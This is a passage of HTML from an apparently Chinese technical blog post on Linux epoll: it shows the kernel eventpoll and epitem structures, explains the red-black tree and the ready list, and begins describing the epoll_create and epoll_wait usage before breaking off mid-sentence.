background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> list_head visited_list_link;</span><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//双向链表中保存着将要通过epoll_wait返回给用户的、满足条件的事件</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 217};  </span> </li></ol> 
</div> 
<br style="line-height:26px; font-family:Arial; font-size:14px; white-space:normal; background-color:rgb(255,255,255)"> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">每一个epoll对象都有一个独立的eventpoll结构体，这个结构体会在内核空间中创造独立的内存，用于存储使用epoll_ctl方法向epoll对象中添加进来的事件。这样，重复的事件就可以通过红黑树而高效的识别出来。</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <br> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">在epoll中，对于每一个事件都会建立一个epitem结构体：</span> </p> 
<div class="dp-highlighter bg_cpp" style="margin:18px 0px!important; width:1044.43px; line-height:26px; overflow:auto; padding-top:1px; font-family:Consolas,'Courier New',Courier,mono,serif; white-space:normal; background-color:rgb(231,229,220)"> 
 <div class="bar" style="padding-left:45px"> 
  <div class="tools" style="padding:3px 8px 10px 10px; color:silver; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:9px; border-left-color:rgb(153,153,153); border-left-width:3px; border-left-style:solid; background-color:rgb(248,248,248)"> 
   <strong>[cpp]</strong>  
   <a target="_blank" title="view plain" class="ViewSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">view plain</a> 
   <a target="_blank" title="copy" class="CopyToClipboard" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">copy</a> 
   <a target="_blank" title="print" class="PrintSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">print</a> 
   <a target="_blank" title="?" class="About" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">?</a> 
   <div style="left:422px; top:6170px; width:29px; height:14px; position:absolute; z-index:99"> 
   </div> 
  </div> 
 </div> 
 <ol class="dp-cpp" start="1" style="margin:0px 0px 1px 45px!important; padding:0px; border:currentColor; color:rgb(92,92,92); background-color:rgb(255,255,255)"><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/*</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 130 * Each file descriptor added to the eventpoll interface will</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 131 * have an entry of this type linked to the "rbr" RB tree.</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 132 * Avoid increasing the size of this struct, there can be many thousands</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 133 * of these on a server and we do not want this to take another cache line.</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 134 */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 135struct epitem {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 136        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* RB tree node used to link this structure to the eventpoll RB tree */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 137        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> rb_node rbn;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 138  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 139        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* List header used to link this structure to the eventpoll ready list */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 140        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> list_head rdllink;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 141  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 142        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/*</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 143         * Works together "struct eventpoll"-&gt;ovflist in keeping the</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 144         * single linked chain of items.</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit"> 145         */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 146        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> epitem *next;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 147  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 148        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* The file descriptor information this item refers to */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 149        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> epoll_filefd ffd;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 150  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 151        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Number of active wait queue attached to poll operations */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 152        <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> nwait;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 153  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 154        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* List containing poll wait queues */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 155        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> list_head pwqlist;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 156  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 157        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* The "container" of this item */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 158        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> eventpoll *ep;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 159  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 160        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* List header used to link this item to the "struct file" items list */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 161        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> list_head fllink;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 162  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 163        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* wakeup_source used when EPOLLWAKEUP is set */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 164        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> wakeup_source __rcu *ws;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 165  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 166        <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* The structure that describe the interested events and the source fd */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 167        <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> epoll_event event;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> 168};  </span> </li></ol> 
</div> 
<br style="line-height:26px; font-family:Arial; font-size:14px; white-space:normal; background-color:rgb(255,255,255)"> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'"><span lang="EN-US">此外，epoll还维护了一个双链表，用户存储发生的事件。</span>当<span lang="EN-US">epoll_wait</span>调用时，仅仅观察这个<span lang="EN-US">list</span>链表里有没有数据即eptime项即可。有数据就返回，没有数据就<span lang="EN-US">sleep</span>，等到<span lang="EN-US">timeout</span>时间到后即使链表没数据也返回。所以，<span lang="EN-US">epoll_wait</span>非常高效。</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> </span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">而且，通常情况下即使我们要监控百万计的句柄，大多一次也只返回很少量的准备就绪句柄而已，所以，<span lang="EN-US">epoll_wait</span>仅需要从内核态<span lang="EN-US">copy</span>少量的句柄到用户态而已，如何能不高效？！<span lang="EN-US"></span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> </span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">那么，这个准备就绪<span lang="EN-US">list</span>链表是怎么维护的呢？<span style="color:rgb(255,0,0)">当我们执行</span><span style="color:rgb(255,0,0)"><span lang="EN-US">epoll_ctl</span>时，除了把<span lang="EN-US">socket</span>放到<span lang="EN-US">epoll</span>文件系统里<span lang="EN-US">file</span>对象对应的红黑树上之外，还会给内核中断处理程序注册一个回调函数，告诉内核，如果这个句柄的中断到了，就把它放到准备就绪<span lang="EN-US">list</span></span><span style="color:rgb(255,0,0)">链表里。</span>所以，当一个<span lang="EN-US">socket</span>上有数据到了，内核在把网卡上的数据<span lang="EN-US">copy</span>到内核中后就来把<span lang="EN-US">socket</span>插入到准备就绪链表里了。</span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US"><span style="font-family:'Times New Roman'"> </span></span> </p> 
<p style="line-height:26px; font-family:Arial; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:'Times New Roman'">如此，一颗红黑树，一张准备就绪句柄链表，少量的内核<span lang="EN-US">cache</span>，就帮我们解决了大并发下的<span lang="EN-US">socket</span>处理问题。执行<span lang="EN-US">epoll_create</span>时，创建了红黑树和就绪链表，执行<span lang="EN-US">epoll_ctl</span>时，如果增加<span lang="EN-US">socket</span>句柄，则检查在红黑树中是否存在，存在立即返回，不存在则添加到树干上，然后向内核注册回调函数，用于当中断事件来临时向准备就绪链表中插入数据。执行<span lang="EN-US">epoll_wait</span>时立刻返回准备就绪链表里的数据即可。</span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<h3 style="margin:0px; padding:0px; line-height:26px; font-family:Arial; white-space:normal; background-color:rgb(255,255,255)"> <span style="background-color:silver"><span style="color:rgb(255,0,0)"><strong><span style="font-family:SimHei; font-size:24px"><span lang="EN-US">epoll</span>的使用方法</span></strong></span></span> </h3> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">那么究竟如何来使用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">呢？其实非常简单。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">通过在包含一个头文件</span><span lang="EN-US" style="font-family:'Times New Roman',serif">#include &lt;sys/epoll.h&gt; </span><span style="font-family:宋体">以及几个简单的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">API</span><span style="font-family:宋体">将可以大大的提高你的网络服务器的支持人数。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">首先通过</span><span lang="EN-US" style="font-family:'Times New Roman',serif">create_epoll(int maxfds)</span><span style="font-family:宋体">来创建一个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">的句柄。这个函数会返回一个新的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">句柄，之后的所有操作将通过这个句柄来进行操作。在用完之后，记得用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">close()</span><span style="font-family:宋体">来关闭这个创建出来的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">句柄。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">之后在你的网络主循环里面，每一帧的调用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_wait(int epfd, epoll_event events, int max events, int timeout)</span><span style="font-family:宋体">来查询所有的网络接口，看哪一个可以读，哪一个可以写了。基本的语法为：</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">nfds = epoll_wait(kdpfd, events, maxevents, -1);</span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">其中</span><span lang="EN-US" style="font-family:'Times New Roman',serif">kdpfd</span><span style="font-family:宋体">为用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_create</span><span style="font-family:宋体">创建之后的句柄，</span><span lang="EN-US" style="font-family:'Times New Roman',serif">events</span><span style="font-family:宋体">是一个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_event*</span><span style="font-family:宋体">的指针，当</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_wait</span><span style="font-family:宋体">这个函数操作成功之后，</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_events</span><span style="font-family:宋体">里面将储存所有的读写事件。</span><span lang="EN-US" style="font-family:'Times New Roman',serif">max_events</span><span style="font-family:宋体">是当前需要监听的所有</span><span lang="EN-US" style="font-family:'Times New Roman',serif">socket</span><span style="font-family:宋体">句柄数。最后一个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">timeout</span><span style="font-family:宋体">是</span><span lang="EN-US" style="font-family:'Times New Roman',serif"> epoll_wait</span><span style="font-family:宋体">的超时，为</span><span lang="EN-US" style="font-family:'Times New Roman',serif">0</span><span 